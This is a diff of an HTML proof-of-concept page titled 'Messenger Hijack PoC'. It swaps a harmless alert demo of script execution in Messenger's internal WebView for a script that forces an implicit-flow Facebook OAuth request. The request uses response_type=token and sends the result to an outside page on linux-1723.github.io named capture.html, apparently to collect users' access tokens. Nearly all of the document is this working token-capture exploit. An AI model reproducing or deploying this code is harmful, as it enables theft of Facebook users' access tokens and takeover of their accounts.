@@ -1,14 +1,18 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Messenger Hijack PoC</title>
-</head>
-<body style="font-family: Arial; padding: 20px; text-align: center;">
-    <h2 style="color: red;">Vulnerability Triggered!</h2>
-    <p>This page has been forcibly loaded inside Messenger's internal BrowserLiteActivity.</p>
+<body>
     <script>
-        // A simple alert to prove JavaScript execution within the Messenger context
-        alert("Success! Running inside Messenger WebView.");
+        // Use a valid Facebook App ID. 
+        // If using your own Dev App, make sure linux-1723.github.io is in the Valid OAuth Redirect URIs.
+        var appId = "1672755387501019"; 
+        var redirectUri = "https://linux-1723.github.io/capture.html";
+        
+        var oauthUrl = "https://www.facebook.com/v18.0/dialog/oauth?" + 
+                       "client_id=" + appId + 
+                       "&redirect_uri=" + encodeURIComponent(redirectUri) + 
+                       "&response_type=token";
+
+        window.location.href = oauthUrl;
     </script>
 </body>
 </html>
